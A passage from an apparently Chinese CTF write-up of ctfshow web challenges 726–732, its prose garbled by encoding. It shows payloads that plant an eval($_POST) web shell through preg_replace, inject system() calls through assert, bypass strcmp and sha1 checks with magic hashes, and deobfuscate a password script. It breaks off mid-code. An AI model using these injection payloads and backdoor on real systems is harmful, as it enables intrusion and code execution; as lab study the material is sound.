<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;;phpinfo();&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>å› ä¸ºåœ¨<code>preg_replace</code>å‡½æ•°ä¸­<code>\\0</code>å’Œ<code>$0</code>ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬</p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥<code>username=$0</code>å<br><code>config.php</code>çš„å†…å®¹å°±å˜æˆäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$db</span>=<span class="hljs-string">&#x27;$db=&#x27;</span>;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-string">&#x27;;&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>ä¸¤ä¸ªå•å¼•å·åˆšå¥½é—­åˆä¸Šï¼ŒæˆåŠŸæ„é€ å‡º<code>eval</code>å‡½æ•°</p>
<p>è®¿é—®config.phpï¼Œä¼ å…¥<code>1=system(&#39;tac flag.php&#39;);</code>,æ‹¿åˆ°flag<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web726-2.jpg"></p>
<h1 id="WEB728"><a href="#WEB728" class="headerlink" title="WEB728"></a>WEB728</h1><p>F12çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>        <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;            <span class="hljs-comment">//å°†pageå˜é‡æ‹¼æ¥æˆä¸€ä¸ªtemplatesä¸‹çš„phpæ–‡ä»¶ï¼Œè®¾ç½®ä¸ºå˜é‡file</span><br>        <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hack!&quot;</span>);            <span class="hljs-comment">//åˆ¤æ–­fileä¸­æ˜¯å¦æœ‰&quot; .. &quot;ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥é€€å‡º</span><br>--&gt;<br></code></pre></td></tr></table></figure>
<p>åˆ©ç”¨<code>&#39;)</code>é—­åˆï¼Œå¹¶ä½¿ç”¨<code>//</code>æ³¨é‡Šåé¢çš„å†…å®¹ï¼Œä»¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</p>
<p>payloadï¼š<br><code>1&#39;) or system(&#39;tac ./templates/flag.php&#39;);//</code></p>
<h1 id="WEB729"><a href="#WEB729" class="headerlink" title="WEB729"></a>WEB729</h1><p>F12çœ‹åˆ°ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>              <span class="hljs-variable">$flag_input</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>              <span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strcmp</span>(flag_input,<span class="hljs-variable">$flag</span>)))<br>              &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;flagä¸æ­£ç¡®&quot;</span>);<br>              &#125;<br>              <span class="hljs-variable">$_p</span> = <span class="hljs-number">6543</span>;<br>              <span class="hljs-variable">$_l</span> = <span class="hljs-number">21</span>;<br><br>              <span class="hljs-variable">$l</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]);<br>              <span class="hljs-variable">$_i</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]);<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$l</span> !== <span class="hljs-variable">$_l</span> || <span class="hljs-variable">$_i</span> !== <span class="hljs-variable">$_p</span>)<br>              &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ç³»ç»Ÿå¼‚å¸¸&quot;</span>);<br>              &#125;<br><br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt; !--<span class="hljs-subst">$flag</span>-- &gt;&quot;</span>;<br>--&gt;<br></code></pre></td></tr></table></figure>
<p>æˆ‘ä»¬éœ€è¦è¿‡ä¸¤ä¸ªifçš„åˆ¤æ–­</p>
<p>ç¬¬ä¸€ä¸ªifï¼š<br><code>strcmp()</code>å‡½æ•°çš„ä½œç”¨æ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç›¸åŒåˆ™ä¸º0ã€‚å› ä¸º<code>strcmp</code>å‡½æ•°æ— æ³•æ¯”è¾ƒæ•°ç»„ï¼Œä¼šè¿”å›0ï¼Œå°†flagè¾“å…¥ä¸ºæ•°ç»„å³å¯ç»•è¿‡ã€‚</p>
<p>ç¬¬äºŒä¸ªifï¼š<br>è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œé•¿åº¦ä¸º21ï¼Œæ•´æ•°å€¼ä¸º6534</p>
<p>ç»¼ä¸Šæ‰€è¿°ï¼Œæ„é€ çš„payloadä¸º</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /?secret=<span class="hljs-number">6543</span>aaaaaaaaaaaaaaaaa<br><span class="hljs-attribute">flag</span>[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB731"><a href="#WEB731" class="headerlink" title="WEB731"></a>WEB731</h1><p>F12çœ‹åˆ°hint<br>ä¸€ä¸ªsha1çš„å¼±æ¯”è¾ƒ<br>ä¼ å…¥ä¸€ä¸ª0eå¼€å¤´çš„å€¼å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>              <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>]);<br>              <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-number">10932435112</span>);<br>              <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hash</span> == <span class="hljs-variable">$target</span>) &#123;<br>                  <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                  <span class="hljs-keyword">print</span> <span class="hljs-variable">$flag</span>;<br>              &#125;<br>--&gt;<br></code></pre></td></tr></table></figure>
<p>å‚è€ƒå€¼</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">aaroZmOk:<span class="hljs-number">0</span>e66507019969427134894567494<span class="hljs-number">305185566735</span><br>aaK1STfY:<span class="hljs-number">0</span>e766585266557562076882711596<span class="hljs-number">24026011393</span><br>aaO8zKZF:<span class="hljs-number">0</span>e89257456677279068558073954<span class="hljs-number">252716165668</span><br>aa3OFF9m:<span class="hljs-number">0</span>e369777862785179849592603940<span class="hljs-number">24281014729</span><br>w9KASOk6Ikap:<span class="hljs-number">0</span>e946854899415574049375681817<span class="hljs-number">16894429726</span><br>CZbnUtm/wD+<span class="hljs-number">0</span>:<span class="hljs-number">00</span>e6513589156647795423839906<span class="hljs-number">410117726741</span><br>RSnake33ncxYMsiIgw:<span class="hljs-number">00</span>e04465709165339343536297988<span class="hljs-number">24448898569</span><br>hashcatRhtkuysFOYYh:<span class="hljs-number">0</span>ec6007027368764166354656983<span class="hljs-number">137779429045</span><br>hashcat7YfJg9x6AqNA:<span class="hljs-number">0</span>e50220802416020462770479580<span class="hljs-number">634172053582</span><br>hashcatJbYtCyUf7I3K:<span class="hljs-number">00</span>e9121985231400931761319208<span class="hljs-number">500866143806</span><br>hashcatZJCFhv5hhkxM:<span class="hljs-number">0</span>e226226307086042822515776180<span class="hljs-number">83953362629</span><br>hashcat7gqQ5KzDJRDe:<span class="hljs-number">0</span>e89084512868781863087376038<span class="hljs-number">568650856166</span><br>hashcatU4BRJMv0wZQ9:<span class="hljs-number">0</span>e266482064222621555984296124<span class="hljs-number">13699840868</span><br>hashcat6gP5u3LfjkB4:<span class="hljs-number">00</span>e4745251895202147342658062<span class="hljs-number">640046218324</span><br>hashcatGqnE8xnyDXTf:<span class="hljs-number">0</span>e15969028436788874806413050<span class="hljs-number">149455726924</span><br>hashcatirBCZWadC4V6:<span class="hljs-number">0</span>e3164985181018719329930928<span class="hljs-number">1808938075168</span><br>hashcat0vScS1X5pWWD:<span class="hljs-number">00</span>e8504108085943725027274200<span class="hljs-number">432213595492</span><br>hashcat46AOYaAyyXRm:<span class="hljs-number">0</span>e12074483623118174676713113<span class="hljs-number">381129899097</span><br>hashcatHArOfcXelAhD:<span class="hljs-number">00</span>e4559098389903496918609646<span class="hljs-number">734123833089</span><br>hashcatQH5Q477JNSPy:<span class="hljs-number">0</span>e55688066453591945830139349<span class="hljs-number">969019185986</span><br>hashcatw1ZBfRtYm5oM:<span class="hljs-number">0</span>e050335622759909145786106186<span class="hljs-number">94299895931</span><br>hashcatoSz6YKuiFR3Y:<span class="hljs-number">0</span>ee0160094252962728385313526<span class="hljs-number">058227602671</span><br>hashcatypQJbFRa1dZt:<span class="hljs-number">0</span>e551050306936667902850440720<span class="hljs-number">61907048558</span><br>hashcatFN2n52JGTFx5:<span class="hljs-number">0</span>e448836342008124394987495855<span class="hljs-number">01922916636</span><br><span class="hljs-number">0</span>e000000000000000000000816146<span class="hljs-number">17300000000</span>:<span class="hljs-number">0</span>e65307525940999632287492285<span class="hljs-number">468259219070</span><br><span class="hljs-number">0</span>e0000000000000000000072190<span class="hljs-number">2017120000000</span>:<span class="hljs-number">0</span>e94981159498252295418182453<span class="hljs-number">841140483274</span><br><span class="hljs-number">0</span>e010110011010110100011011<span class="hljs-number">10101100101000</span>:<span class="hljs-number">0</span>e48906523151976751117677463<span class="hljs-number">787111106598</span><br><span class="hljs-number">0</span>e11001000001010011000100000<span class="hljs-number">010001101000</span>:<span class="hljs-number">0</span>e634071849609304190270627777<span class="hljs-number">05081379452</span><br><span class="hljs-number">0</span>e010000011000000010100110<span class="hljs-number">11001000000100</span>:<span class="hljs-number">0</span>e55962072388397083814346733<span class="hljs-number">718698213796</span><br><span class="hljs-number">0</span>e1001111000010110100001110<span class="hljs-number">1011010100100</span>:<span class="hljs-number">0</span>e31188585417285828785355336<span class="hljs-number">774237712792</span><br><span class="hljs-number">0</span>e010101110001111110101010<span class="hljs-number">11010111010100</span>:<span class="hljs-number">0</span>e4590634456961665942880889<span class="hljs-number">2091261969181</span><br><span class="hljs-number">0</span>e001000011100000011110100<span class="hljs-number">00010011101100</span>:<span class="hljs-number">0</span>e14860258669052332549568607<span class="hljs-number">710438132953</span><br><span class="hljs-number">0</span>e1111000011101000100110111<span class="hljs-number">1111110010010</span>:<span class="hljs-number">0</span>e121742584363857585528744269<span class="hljs-number">41686538483</span><br><span class="hljs-number">0</span>e1011111001110010110001010<span class="hljs-number">1111010000110</span>:<span class="hljs-number">0</span>e997743982825933760434620385<span class="hljs-number">72281385389</span><br><span class="hljs-number">0</span>e110011111101111100101110<span class="hljs-number">10000011110110</span>:<span class="hljs-number">0</span>e631852213010346249403454710<span class="hljs-number">74357888797</span><br><span class="hljs-number">0</span>e000010100101011001001010<span class="hljs-number">11101110001110</span>:<span class="hljs-number">0</span>e90943988772171749054413593<span class="hljs-number">888105986782</span><br><span class="hljs-number">0</span>e01011101110010111011110010<span class="hljs-number">010010101110</span>:<span class="hljs-number">0</span>e016088001926598035767713466<span class="hljs-number">07441737826</span><br><span class="hljs-number">0</span>e10111110101111001000000<span class="hljs-number">100011101101110</span>:<span class="hljs-number">0</span>e4909454145847949526303429<span class="hljs-number">4421025186938</span><br><span class="hljs-number">0</span>e111001111011100110101110<span class="hljs-number">01010101111110</span>:<span class="hljs-number">0</span>e557707061499487600862007135<span class="hljs-number">05841887543</span><br><span class="hljs-number">0</span>e1111100101010110011001100<span class="hljs-number">1010001110001</span>:<span class="hljs-number">0</span>e91120687121163809515824135<span class="hljs-number">435029958137</span><br><span class="hljs-number">0</span>e010001111011111100100100100<span class="hljs-number">00001001001</span>:<span class="hljs-number">0</span>e780717973285463693018254208<span class="hljs-number">48872451849</span><br><span class="hljs-number">0</span>e0010011010001010011000110<span class="hljs-number">1110110110101</span>:<span class="hljs-number">0</span>e060773804082606146592199205<span class="hljs-number">61082767632</span><br><span class="hljs-number">0</span>e11111100001011000011110100<span class="hljs-number">100010111101</span>:<span class="hljs-number">0</span>e121491203544153352207583994<span class="hljs-number">92713921588</span><br><span class="hljs-number">0</span>e00111100110101101001000<span class="hljs-number">101011011111101</span>:<span class="hljs-number">0</span>e386611265697905555984319050<span class="hljs-number">65403870516</span><br><span class="hljs-number">0</span>e10100011100101000001110010<span class="hljs-number">100110100011</span>:<span class="hljs-number">0</span>e557450781546402125115962590<span class="hljs-number">55910278070</span><br><span class="hljs-number">0</span>e10011110011111001001100100<span class="hljs-number">000111011011</span>:<span class="hljs-number">0</span>e203197311231014779132957<span class="hljs-number">20812414482217</span><br>&amp;O&amp;GKtn&amp;<span class="hljs-number">54</span>xQ:<span class="hljs-number">00</span>e8144605926111857621787045<span class="hljs-number">161777776795</span><br>Sk~HOM&amp;QzJXl:<span class="hljs-number">00</span>e8943083323373991014599597<span class="hljs-number">566984182387</span><br><span class="hljs-number">1023456852390915</span>:<span class="hljs-number">0</span>e263793747703520246661489688<span class="hljs-number">68586665768</span><br>lowercasegzmgqmx:<span class="hljs-number">0</span>e462572807872319436183060736<span class="hljs-number">89855362607</span><br>lowercasifdvqkfr:<span class="hljs-number">0</span>e11372668415308535558155136<span class="hljs-number">274413213182</span><br>lowercasebchqcwctky:<span class="hljs-number">0</span>e632700192129617919000556987<span class="hljs-number">86302314274</span><br>lowercaseabcsobpkrt:<span class="hljs-number">0</span>e54706107047262165256262457<span class="hljs-number">226759421225</span><br>UPPERCASFFLIIQWR:<span class="hljs-number">00</span>e0209539108131630074694125<span class="hljs-number">235505223102</span><br>MixedCaseERWqTVQ:<span class="hljs-number">0</span>e26765837881628507475765845<span class="hljs-number">815158037783</span><br>MixCaseDigJiRR9d:<span class="hljs-number">00</span>e69706953514223243490393817<span class="hljs-number">94949865825</span><br>Punc!<span class="hljs-number">0</span>&quot;*!&quot;#$<span class="hljs-number">8</span>!zv:<span class="hljs-number">0</span>e77726009946581613829608157<span class="hljs-number">794165640009</span><br>Punctu!U&quot;F5ru:<span class="hljs-number">0</span>e100057698412719994061415552<span class="hljs-number">58742283712</span><br>Punctuatiow$&#x27;l9X:<span class="hljs-number">0</span>e16039695246683143323677708<span class="hljs-number">220808911326</span><br>Punctuati0t..jsI:<span class="hljs-number">0</span>e772379489690141187949100916<span class="hljs-number">59528041921</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB732"><a href="#WEB732" class="headerlink" title="WEB732"></a>WEB732</h1><p>F12å¾—åˆ°hint:password.js</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>              password.js<br>--&gt;<br></code></pre></td></tr></table></figure>

<p>è®¿é—®åå‘ç°æ˜¯è¢«æ··æ·†è¿‡çš„jsä»£ç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> _0x575c=[<span class="hljs-string">&#x27;\x32\x2d\x34&#x27;</span>,<span class="hljs-string">&#x27;\x73\x75\x62\x73\x74\x72\x69\x6e\x67&#x27;</span>,<span class="hljs-string">&#x27;\x34\x2d\x37&#x27;</span>,<span class="hljs-string">&#x27;\x67\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x64\x65\x6c\x65\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x31\x32\x2d\x31\x34&#x27;</span>,<span class="hljs-string">&#x27;\x30\x2d\x32&#x27;</span>,<span class="hljs-string">&#x27;\x73\x65\x74\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x39\x2d\x31\x32&#x27;</span>,<span class="hljs-string">&#x27;\x5e\x37\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x75\x70\x64\x61\x74\x65\x49\x74\x65\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x62\x62\x3d&#x27;</span>,<span class="hljs-string">&#x27;\x37\x2d\x39&#x27;</span>,<span class="hljs-string">&#x27;\x31\x34\x2d\x31\x36&#x27;</span>,<span class="hljs-string">&#x27;\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65&#x27;</span>,];(<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae,_0x575cf8</span>)&#123;<span class="hljs-keyword">var</span> _0x51eea2=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x180eeb</span>)&#123;<span class="hljs-keyword">while</span>(--_0x180eeb)&#123;_0x4f0aae[<span class="hljs-string">&#x27;push&#x27;</span>](_0x4f0aae[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="hljs-title function_">_0x51eea2</span>(++_0x575cf8);&#125;(_0x575c,<span class="hljs-number">0x78</span>));<span class="hljs-keyword">var</span> _0x51ee=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae,_0x575cf8</span>)&#123;_0x4f0aae=_0x4f0aae-<span class="hljs-number">0x0</span>;<span class="hljs-keyword">var</span> _0x51eea2=_0x575c[_0x4f0aae];<span class="hljs-keyword">return</span> _0x51eea2;&#125;;<span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckPassword</span>(<span class="hljs-params">_0x47df21</span>)&#123;<span class="hljs-keyword">var</span> _0x4bbdc3=[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xe&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x3&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x7&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x4&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>)];<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;9-12&#x27;</span>,<span class="hljs-string">&#x27;BE*&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>),<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xb&#x27;</span>));<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>),<span class="hljs-string">&#x27;5W&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x9&#x27;</span>));<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>),<span class="hljs-string">&#x27;pg&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;7-9&#x27;</span>,<span class="hljs-string">&#x27;+n&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>),<span class="hljs-string">&#x27;4t&#x27;</span>);<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>),<span class="hljs-string">&#x27;$F&#x27;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x8&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x9</span>,<span class="hljs-number">0xc</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>))===_0x47df21[<span class="hljs-string">&#x27;substring&#x27;</span>](<span class="hljs-number">0x4</span>,<span class="hljs-number">0x7</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x0</span>,<span class="hljs-number">0x2</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-string">&#x27;16&#x27;</span>)===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x10</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xc</span>,<span class="hljs-number">0xe</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xc&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x7</span>,<span class="hljs-number">0x9</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xe</span>,<span class="hljs-number">0x10</span>))&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>))===_0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>))<span class="hljs-keyword">return</span>!![];&#125;&#125;&#125;&#125;&#125;&#125;&#125;<span class="hljs-keyword">return</span>![];&#125;<br></code></pre></td></tr></table></figure>

<p><a href="https://www.sojson.com/jsjiemi.html">åœ¨çº¿è§£å¯†</a>åjsä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> _0x575c = [<span class="hljs-string">&#x27;2-4&#x27;</span>, <span class="hljs-string">&#x27;substring&#x27;</span>, <span class="hljs-string">&#x27;4-7&#x27;</span>, <span class="hljs-string">&#x27;getItem&#x27;</span>, <span class="hljs-string">&#x27;deleteItem&#x27;</span>, <span class="hljs-string">&#x27;12-14&#x27;</span>, <span class="hljs-string">&#x27;0-2&#x27;</span>, <span class="hljs-string">&#x27;setItem&#x27;</span>, <span class="hljs-string">&#x27;9-12&#x27;</span>, <span class="hljs-string">&#x27;^7M&#x27;</span>, <span class="hljs-string">&#x27;updateItem&#x27;</span>, <span class="hljs-string">&#x27;bb=&#x27;</span>, <span class="hljs-string">&#x27;7-9&#x27;</span>, <span class="hljs-string">&#x27;14-16&#x27;</span>, <span class="hljs-string">&#x27;localStorage&#x27;</span>, ];<br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae, _0x575cf8</span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x51eea2 = <span class="hljs-keyword">function</span>(<span class="hljs-params">_0x180eeb</span>) &#123;<br>        <span class="hljs-keyword">while</span> (--_0x180eeb) &#123;<br>            _0x4f0aae[<span class="hljs-string">&#x27;push&#x27;</span>](_0x4f0aae[<span class="hljs-string">&#x27;shift&#x27;</span>]());<br>        &#125;<br>    &#125;;<br>    <span class="hljs-title function_">_0x51eea2</span>(++_0x575cf8);<br>&#125;(_0x575c, <span class="hljs-number">0x78</span>));<br><span class="hljs-keyword">var</span> _0x51ee = <span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4f0aae, _0x575cf8</span>) &#123;<br>    _0x4f0aae = _0x4f0aae - <span class="hljs-number">0x0</span>;<br>    <span class="hljs-keyword">var</span> _0x51eea2 = _0x575c[_0x4f0aae];<br>    <span class="hljs-keyword">return</span> _0x51eea2;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckPassword</span>(<span class="hljs-params">_0x47df21</span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x4bbdc3 = [<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xe&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x3&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x7&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x4&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>)];<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;9-12&#x27;</span>, <span class="hljs-string">&#x27;BE*&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>), <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xb&#x27;</span>));<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>), <span class="hljs-string">&#x27;5W&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x9&#x27;</span>));<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>), <span class="hljs-string">&#x27;pg&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-string">&#x27;7-9&#x27;</span>, <span class="hljs-string">&#x27;+n&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>), <span class="hljs-string">&#x27;4t&#x27;</span>);<br>    <span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x2</span>]](<span class="hljs-title function_">_0x51ee</span>(<span 